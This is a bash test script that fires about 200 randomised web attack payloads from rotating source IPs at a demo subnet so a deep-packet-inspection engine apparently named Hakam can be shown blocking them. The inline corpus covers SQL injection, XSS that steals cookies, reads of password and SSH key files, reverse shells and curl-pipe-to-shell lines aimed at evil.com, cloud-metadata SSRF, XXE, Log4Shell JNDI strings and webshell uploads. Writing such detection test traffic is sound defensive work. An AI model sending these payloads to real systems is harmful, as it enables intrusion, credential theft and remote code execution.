#!/usr/bin/env bash
# seclist-attack.sh — fires randomised attack payloads at the demo network so
# the Hakam DPI engine has to identify and block them in real time.
#
# Modes:
#   ./scripts/seclist-attack.sh                  # 30 random shots, then exit
#   ./scripts/seclist-attack.sh -n 100           # 100 random shots
#   ./scripts/seclist-attack.sh -c               # continuous (Ctrl-C to stop)
#   ./scripts/seclist-attack.sh -k SQLi          # only SQLi payloads
#   ./scripts/seclist-attack.sh -k XSS -n 50     # 50 XSS payloads
#   ./scripts/seclist-attack.sh -l               # list categories and exit
#
# All payloads are sourced inline (~200 patterns) so this script is self-contained.
# Source IPs rotate through the three demo workstations (PC1 / PC2 / external).
# Targets the database alias (10.99.0.10) on TCP/80 by default.

set -uo pipefail

# ── Defaults ────────────────────────────────────────────────────────────────
TARGET_IP="${TARGET_IP:-10.99.0.10}"
TARGET_PORT="${TARGET_PORT:-80}"
# 20-IP rotating source pool. Hakam auto-blocks each source after the first
# detection (XDP_DROP becomes the hot path), so a wide pool keeps the DPI
# engine seeing fresh sources until BLOCK_TTL_SECS (120 s) recycles them.
# Override at the call site by exporting SOURCES=("a.b.c.d" "...").
if [[ -z "${SOURCES+x}" ]]; then
    SOURCES=()
    for i in 10 11 12 13 14 15 16 17 18 19; do SOURCES+=("10.99.1.$i"); done
    for i in 10 11 12 13 14 15 16 17 18 19; do SOURCES+=("10.99.2.$i"); done
fi
DELAY_MS=300
COUNT=30
CONTINUOUS=0
CATEGORY=""
LIST_ONLY=0

# ── Colours ────────────────────────────────────────────────────────────────
RED=$'\033[0;31m'; BRED=$'\033[1;31m'
YLW=$'\033[1;33m'; CYN=$'\033[0;36m'
GRN=$'\033[0;32m'; MAG=$'\033[0;35m'
DIM=$'\033[2m'  ; BLD=$'\033[1m'  ; RST=$'\033[0m'

usage() {
    cat <<EOF
${BRED}hakam seclist-attack${RST} ${DIM}— randomised payload firehose${RST}

  -n N         number of attacks to fire (default 30)
  -c           continuous mode (loop until Ctrl-C)
  -k CAT       restrict to a category (SQLi|XSS|LFI|RCE|SSRF|XXE|Log4Shell|NoSQLi|SSTI|WebShell|Recon|CVE)
  -d MS        delay between shots in milliseconds (default 300)
  -t IP:PORT   target host:port (default ${TARGET_IP}:${TARGET_PORT})
  -l           list all categories with payload counts and exit
  -h           help
EOF
}

# ── Payload corpus ─────────────────────────────────────────────────────────
# Format per line:  CATEGORY|HTTP_PATH_OR_BODY
# Categories mirror the kernel-side signature families.
IFS= read -r -d '' PAYLOADS <<'PAY' || true
SQLi|/login?u=admin'--&p=x
SQLi|/search?q=' OR '1'='1
SQLi|/search?q=1' OR 1=1--
SQLi|/items?id=1 UNION SELECT username,password FROM users--
SQLi|/items?id=1 UNION ALL SELECT NULL,NULL,NULL--
SQLi|/api?id=1; DROP TABLE users--
SQLi|/api?id=1' AND SLEEP(5)--
SQLi|/q?x=1' AND BENCHMARK(5000000,MD5(1))--
SQLi|/q?x=1' AND PG_SLEEP(5)--
SQLi|/q?x=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
SQLi|/q?x=1 ORDER BY 1--
SQLi|/q?x=1 HAVING 1=1
SQLi|/q?x=admin' #
SQLi|/login.php?user=admin'--&pass=
SQLi|/login.php?user=' OR 'a'='a&pass=
SQLi|/api/v1?id=1' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--
SQLi|/admin?cmd=EXEC xp_cmdshell 'whoami'
SQLi|/api?n=1' INTO OUTFILE '/var/www/shell.php'--
SQLi|/api?id=1 AND (SELECT * FROM INFORMATION_SCHEMA.TABLES)
SQLi|/api?id=1; WAITFOR DELAY '0:0:5'--
SQLi|/q?id=1/*!50000UNION*/SELECT 1,2,3--
SQLi|/q?id=CHAR(0x41)
SQLi|/q?id=CONCAT(0x70,0x61)
SQLi|/q?id=CHR(65)
SQLi|/q?id=1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),0)--
XSS|/page?c=<script>alert(1)</script>
XSS|/page?c=<script src=//evil.com/x.js></script>
XSS|/page?c=<img src=x onerror=alert(1)>
XSS|/page?c=<svg onload=alert(1)>
XSS|/page?c=<iframe src=javascript:alert(1)>
XSS|/page?c=<body onload=alert(1)>
XSS|/page?c=<input onfocus=alert(1) autofocus>
XSS|/page?c=<a href=javascript:alert(1)>x</a>
XSS|/page?c=<object data=javascript:alert(1)>
XSS|/page?c=<embed src=javascript:alert(1)>
XSS|/page?c=<applet code=Evil.class>
XSS|/page?c=<marquee onstart=alert(1)>
XSS|/page?c=<form action=javascript:alert(1)><input type=submit>
XSS|/page?c=<meta http-equiv=refresh content=0;url=javascript:alert(1)>
XSS|/page?c=<base href=javascript:alert(1)//>
XSS|/page?c=<link rel=stylesheet href=data:text/html,<script>alert(1)</script>>
XSS|/page?c=<svg><script>alert(1)</script></svg>
XSS|/page?c=javascript:alert(document.cookie)
XSS|/page?c=<img src=x onerror=this.src='//evil.com/'%2bdocument.cookie>
XSS|/page?c=<div style=expression(alert(1))>
XSS|/page?c=<xml id=x><a><b>x</b></a></xml>
XSS|/page?c=<textarea autofocus onfocus=alert(1)>
XSS|/page?c=data:text/html,<script>alert(1)</script>
XSS|/page?c=<svg/onload=eval(atob('YWxlcnQoMSk='))>
XSS|/page?c=<a xlink:href=javascript:alert(1)>x</a>
LFI|/file?n=../../../../etc/passwd
LFI|/file?n=..\..\..\..\windows\win.ini
LFI|/file?n=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
LFI|/file?n=%252e%252e%252fetc%252fpasswd
LFI|/file?n=....//....//etc/passwd
LFI|/file?n=/etc/shadow
LFI|/file?n=/etc/hosts
LFI|/file?n=/proc/self/environ
LFI|/file?n=/proc/version
LFI|/file?n=C:/boot.ini
LFI|/file?n=C:/windows/win.ini
LFI|/file?n=/root/.ssh/authorized_keys
LFI|/file?n=/home/user/.ssh/id_rsa
LFI|/file?n=/var/www/wp-config.php
LFI|/file?n=/inetpub/wwwroot/web.config
LFI|/file?n=/.htaccess
LFI|/cms?file=../../app.env
LFI|/cms?file=../../etc/passwd
LFI|/cms?file=..%2f..%2fetc%2fpasswd
LFI|/cms?file=..%5c..%5cwindows%5cwin.ini
RCE|/exec?cmd=;cat /etc/passwd
RCE|/exec?cmd=;ls -la /
RCE|/exec?cmd=;id;
RCE|/exec?cmd=;whoami
RCE|/exec?cmd=;uname -a
RCE|/exec?cmd=;pwd;
RCE|/exec?cmd=;ps aux
RCE|/exec?cmd=|/bin/sh -c id
RCE|/exec?cmd=|bash -i
RCE|/exec?cmd=|/bin/bash -c whoami
RCE|/exec?cmd=&&cat /etc/passwd
RCE|/exec?cmd=&&ls /
RCE|/exec?cmd=;nc -e /bin/sh evil.com 4444
RCE|/exec?cmd=;ncat evil.com 4444 -e /bin/sh
RCE|/exec?cmd=;wget http://evil.com/x.sh
RCE|/exec?cmd=;curl http://evil.com/x.sh|sh
RCE|/exec?cmd=||cat /etc/passwd
RCE|/exec?cmd=$(cat /etc/passwd)
RCE|/exec?cmd=`cat /etc/passwd`
RCE|/exec?cmd=cat${IFS}/etc/passwd
RCE|/exec?cmd=;phpinfo();
RCE|/exec?cmd=bash -c 'id'
RCE|/exec?cmd=sh -c 'id'
RCE|/exec?cmd=exec('id')
RCE|/exec?cmd=system('id')
RCE|/exec?cmd=popen('id','r')
RCE|/exec?cmd=passthru('id')
RCE|/exec?cmd=shell_exec('id')
RCE|/exec?cmd=proc_open('id',[],$p)
RCE|/exec?cmd=echo aWQ=|base64 -d|sh
SSRF|/fetch?u=http://127.0.0.1/admin
SSRF|/fetch?u=http://localhost:8080/internal
SSRF|/fetch?u=http://0.0.0.0/secret
SSRF|/fetch?u=http://[::1]/admin
SSRF|/fetch?u=http://169.254.169.254/latest/meta-data/iam/security-credentials/
SSRF|/fetch?u=http://metadata.google.internal/computeMetadata/v1/
SSRF|/fetch?u=http://169.254.169.254/metadata/identity/oauth2/token
SSRF|/fetch?u=file:///etc/passwd
SSRF|/fetch?u=ftp://internal/secret.txt
SSRF|/fetch?u=gopher://127.0.0.1:6379/_FLUSHALL
SSRF|/fetch?u=dict://127.0.0.1:11211/stats
SSRF|/fetch?u=sftp://attacker@evil.com/root/.ssh/id_rsa
SSRF|/fetch?u=ldap://internal-ad/cn=users
SSRF|/fetch?u=expect://id
SSRF|/fetch?u=php://input
XXE|/upload?xml=<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
XXE|/upload?xml=<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]>&xxe;
XXE|/upload?xml=<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://evil.com/x">]>
XXE|/upload?xml=<!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>]>
XXE|/upload?xml=<xi:include href="file:///etc/passwd" parse="text" xmlns:xi="http://www.w3.org/2001/XInclude"/>
XXE|/upload?xml=<?xml-stylesheet href="evil.xsl" type="text/xsl"?>
XXE|/upload?xml=<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil.com/x.dtd"> %p;]>
XXE|/upload?xml=<!DOCTYPE r [<!ELEMENT a (#PCDATA)>]>
XXE|/upload?xml=<!ENTITY % all "<!ENTITY send SYSTEM 'http://evil.com/?d=%file;'>">
XXE|/upload?xml=<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/issue">]><r>&xxe;</r>
Log4Shell|/api?h=${jndi:ldap://evil.com/x}
Log4Shell|/login?u=${jndi:ldap://attacker.example/exploit}
Log4Shell|/api?h=${jndi:rmi://evil.com:1099/x}
Log4Shell|/api?h=${jndi:dns://evil.com/x}
Log4Shell|/api?h=${${lower:j}ndi:ldap://evil.com/x}
Log4Shell|/api?h=${${upper:j}ndi:ldap://evil.com/x}
Log4Shell|/api?h=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}
NoSQLi|/api/users?username[$ne]=admin
NoSQLi|/api/users?id[$gt]=
NoSQLi|/api/users?id[$lt]=99999
NoSQLi|/api/users?username[$where]=1
NoSQLi|/api/users?email[$regex]=.*
NoSQLi|/api/users {"username":{"$ne":null}}
NoSQLi|/api/users {"id":{"$gt":""}}
NoSQLi|/api/users {"$where":"this.password.length>0"}
NoSQLi|/api/users '; return true; var x='
NoSQLi|/api/aggregate?op=mapReduce
SSTI|/render?n={{7*7}}
SSTI|/render?n={{7*'7'}}
SSTI|/render?n={{config}}
SSTI|/render?n={{config.SECRET_KEY}}
SSTI|/render?n=${{7*7}}
SSTI|/render?n=<%=7*7%>
SSTI|/render?n=#{7*7}
SSTI|/render?n=*{7*7}
SSTI|/render?n={{request.application.__globals__}}
SSTI|/render?n={{self.__class__.__mro__}}
WebShell|/uploads/c99.php?act=cmd&cmd=id
WebShell|/uploads/r57.php?cmd=ls
WebShell|/uploads/wso.php?act=phpeval
WebShell|/uploads/b374k.php?cmd=whoami
WebShell|/uploads/weevely.php?p=id
WebShell|/admin/china_chopper.aspx?password=test
WebShell|/upload?file=<?php eval($_POST['x']); ?>
WebShell|/upload?file=<?php eval($_GET['c']); ?>
WebShell|/upload?file=<?php assert($_REQUEST['x']); ?>
WebShell|/upload?file=<?php base64_decode($_POST['x']); ?>
Recon|/phpmyadmin/index.php
Recon|/.git/config
Recon|/.svn/entries
Recon|/.env
Recon|/config.php
Recon|/wp-admin/install.php
Recon|/wp-login.php
Recon|/setup.php
Recon|/install.php
Recon|/cgi-bin/test.cgi
Recon|/manager/html
Recon|/.well-known/security.txt
Recon|/actuator/env
Recon|/v2/api-docs/swagger.json
Recon|/.aws/credentials
CVE|/cgi-bin/x.sh () { :;}; echo vulnerable
CVE|/log4j?p=CVE-2021-44228
CVE|/MOVEit.dll
CVE|/_vti_bin/owssvr.dll
CVE|/struts2-showcase/showcase.action
CVE|/springshell?class.module.classLoader.resources=
CVE|/manager/jmxproxy?qry=java.lang:type=Memory
CVE|/cmdplugin?cmd=id
CVE|/xml-rpc.php
CVE|/upl.php?file=shell.php
PAY

# ── Argument parsing ───────────────────────────────────────────────────────
while getopts ":n:cd:k:t:lh" opt; do
    case $opt in
        n) COUNT=$OPTARG ;;
        c) CONTINUOUS=1 ;;
        d) DELAY_MS=$OPTARG ;;
        k) CATEGORY=$OPTARG ;;
        t) TARGET_IP="${OPTARG%%:*}"; TARGET_PORT="${OPTARG##*:}" ;;
        l) LIST_ONLY=1 ;;
        h) usage; exit 0 ;;
        \?) echo "unknown option -$OPTARG"; usage; exit 1 ;;
    esac
done

# ── Helpers ────────────────────────────────────────────────────────────────
list_categories() {
    echo
    echo "  ${BRED}▸ payload corpus${RST} ${DIM}(seclist-attack.sh)${RST}"
    echo "  ──────────────────────────────────────────────────────────────"
    awk -F'|' 'NF>=2 {print $1}' <<<"$PAYLOADS" \
      | sort | uniq -c \
      | awk -v BLD="$BLD" -v YLW="$YLW" -v RST="$RST" \
            '{printf "    %s%-12s%s %s%3d%s payloads\n", BLD,$2,RST, YLW,$1,RST}'
    local total
    total=$(grep -c '^[A-Za-z]' <<<"$PAYLOADS" || echo 0)
    echo
    echo "    ${DIM}total: ${RST}${BLD}${total}${RST} ${DIM}payloads across all categories${RST}"
    echo
}

filter_payloads() {
    if [[ -n "$CATEGORY" ]]; then
        grep -i "^${CATEGORY}|" <<<"$PAYLOADS" || true
    else
        # Drop blank lines from the trailing heredoc newline.
        grep -v '^[[:space:]]*$' <<<"$PAYLOADS"
    fi
}

random_pick() {
    local pool n line
    pool="$1"
    n=$(wc -l <<<"$pool" | tr -d ' ')
    [[ $n -eq 0 ]] && return 1
    line=$((RANDOM % n + 1))
    sed -n "${line}p" <<<"$pool"
}

ensure_iface() {
    if ! command -v ip >/dev/null; then
        echo "${YLW}note: 'ip' tool unavailable — skipping iface check${RST}"
        return
    fi
    if ! ip addr show | grep -q "${TARGET_IP%.*}\.10/24"; then
        echo "${YLW}warning: demo subnet not configured — set up dummy0 first${RST}"
    fi
}

fire_attack() {
    local entry category path src
    entry="$1"
    category="${entry%%|*}"
    path="${entry#*|}"

    src="${SOURCES[$RANDOM % ${#SOURCES[@]}]}"

    local sev_color="$YLW"
    [[ "$category" == "SQLi" || "$category" == "RCE" || "$category" == "Log4Shell" || "$category" == "WebShell" ]] && sev_color="$BRED"
    [[ "$category" == "Recon" ]] && sev_color="$DIM$CYN"

    printf "  ${DIM}[%(%H:%M:%S)T]${RST}  ${sev_color}%-10s${RST}  ${DIM}%s →${RST} ${MAG}%s${RST}\n" \
        -1 "$category" "$src" "${TARGET_IP}:${TARGET_PORT}"
    printf "    ${DIM}%s${RST}\n" "$(echo "$path" | head -c 100)"

    # Send the HTTP request from the rotating source IP. Suppress nc errors
    # since most of these targets won't actually respond.
    {
        printf 'GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: hakam-attack/1.0\r\n\r\n' \
            "$path" "$TARGET_IP"
    } | nc -s "$src" -w 1 "$TARGET_IP" "$TARGET_PORT" >/dev/null 2>&1 &

    return 0
}

# ── Main ───────────────────────────────────────────────────────────────────
if [[ $LIST_ONLY -eq 1 ]]; then
    list_categories
    exit 0
fi

# Header
echo
echo "  ${BRED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"
echo "  ${BRED}  HAKAM SECLIST FIREHOSE${RST}    ${DIM}target ${TARGET_IP}:${TARGET_PORT}${RST}"
echo "  ${BRED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"
[[ -n "$CATEGORY" ]] && echo "  ${DIM}filter:${RST} ${BLD}${CATEGORY}${RST}"
[[ $CONTINUOUS -eq 1 ]] && echo "  ${DIM}mode:${RST}   ${BLD}continuous${RST} ${DIM}(Ctrl-C to stop)${RST}"
[[ $CONTINUOUS -eq 0 ]] && echo "  ${DIM}mode:${RST}   ${BLD}${COUNT}${RST} shots, ${BLD}${DELAY_MS}${RST}ms apart"
echo

ensure_iface

POOL=$(filter_payloads)
POOL_N=$(wc -l <<<"$POOL" | tr -d ' ')
if [[ -z "$POOL" || "$POOL_N" -eq 0 ]]; then
    echo "${RED}no payloads matched category '${CATEGORY}'${RST}"
    echo "${DIM}use -l to see available categories${RST}"
    exit 1
fi

trap 'echo; echo "  ${YLW}stopped — fired $FIRED attacks${RST}"; exit 0' INT

FIRED=0
SLEEP_SECS=$(awk -v ms="$DELAY_MS" 'BEGIN{printf "%.3f", ms/1000}')

while true; do
    line=$(random_pick "$POOL") || break
    fire_attack "$line"
    FIRED=$((FIRED + 1))

    if [[ $CONTINUOUS -eq 0 && $FIRED -ge $COUNT ]]; then
        break
    fi
    sleep "$SLEEP_SECS"
done

echo
echo "  ${GRN}━━ done ━━${RST}  fired ${BLD}${FIRED}${RST} attacks across ${BLD}${POOL_N}${RST} candidate payloads"
echo "  ${DIM}check the hakam-node terminal — DPI events should be streaming.${RST}"
echo
